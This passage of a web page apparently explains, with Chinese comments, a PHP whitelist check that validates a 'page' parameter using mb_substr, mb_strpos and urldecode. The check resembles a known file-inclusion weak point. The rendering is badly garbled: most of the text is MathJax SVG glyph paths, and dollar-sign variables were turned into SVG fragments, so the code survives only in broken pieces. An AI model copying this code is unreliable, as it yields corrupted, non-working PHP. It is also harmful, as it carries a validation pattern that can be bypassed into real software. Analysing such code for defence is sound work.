<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1980" y="0"></use>
</g>
</svg>whitelist)) { //如果<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.521ex" height="3.343ex" style="vertical-align: -1.171ex; margin-left: -0.089ex;" viewBox="-38.5 -934.9 6682.8 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page变量存在于</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
<g transform="translate(1980,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">变</text>
</g>
<g transform="translate(2912,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">量</text>
</g>
<g transform="translate(3845,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">存</text>
</g>
<g transform="translate(4778,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">在</text>
</g>
<g transform="translate(5711,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">于</text>
</g>
</g>
</svg>whitelist数组中<br>                return true;                   //返回true<br>            }</p>
<p>            $_page = mb_substr(   //mb_substr — 获取部分字符串<br>                $page,<br>                0,<br>                mb_strpos($page . ‘?’, ‘?’)    //mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置<br>            );<br>            if (in_array(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.199ex" height="2.343ex" style="vertical-align: -1.005ex; margin-left: -0.063ex;" viewBox="-27.2 -576.1 2238.3 1008.6" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_page,&nbsp;</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-70" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-61" x="456" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="985" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1466" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1932" y="0"></use>
</g>
</svg>whitelist)) {<br>                return true;<br>            }    //本段代码的意思，截取<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="28.822ex" height="3.676ex" style="vertical-align: -1.171ex; margin-left: -0.089ex;" viewBox="-38.5 -1078.4 12409.3 1582.7" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page变量内'?'前的字符，如果</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3F" d="M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
<g transform="translate(1980,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">变</text>
</g>
<g transform="translate(2912,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">量</text>
</g>
<g transform="translate(3845,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">内</text>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1319" y="831"></use>
</g>
<g transform="translate(5073,0)">
 <use xlink:href="#E1-MJMAIN-3F" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="668" y="583"></use>
</g>
<g transform="translate(5840,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">前</text>
</g>
<g transform="translate(6773,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">的</text>
</g>
<g transform="translate(7706,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">字</text>
</g>
<g transform="translate(8639,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">符</text>
</g>
<g transform="translate(9572,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">，</text>
</g>
<g transform="translate(10505,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">如</text>
</g>
<g transform="translate(11437,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">果</text>
</g>
</g>
</svg>page变量中不含’?’则截取$page变量的整个部分</p>
<p>            <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="18.36ex" height="3.009ex" style="vertical-align: -1.005ex; margin-left: -0.063ex;" viewBox="-27.2 -863.1 7904.8 1295.7" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_page&nbsp;=&nbsp;urldecode(</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path>
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path>
<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-70" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-61" x="456" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="985" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1466" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="2210" y="0"></use>
 <use xlink:href="#E1-MJMATHI-75" x="3266" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="3839" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="4290" y="0"></use>
 <use xlink:href="#E1-MJMATHI-64" x="4589" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="5112" y="0"></use>
 <use xlink:href="#E1-MJMATHI-63" x="5579" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6F" x="6012" y="0"></use>
 <use xlink:href="#E1-MJMATHI-64" x="6498" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="7021" y="0"></use>
 <use xlink:href="#E1-MJMAIN-28" x="7488" y="0"></use>
</g>
</svg>page); //对$page变量进行url解码<br>            $_page = mb_substr(<br>                $_page,<br>                0,<br>                mb_strpos($_page . ‘?’, ‘?’)<br>            );<br>            if (in_array(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.199ex" height="2.343ex" style="vertical-align: -1.005ex; margin-left: -0.063ex;" viewBox="-27.2 -576.1 2238.3 1008.6" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_page,&nbsp;</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
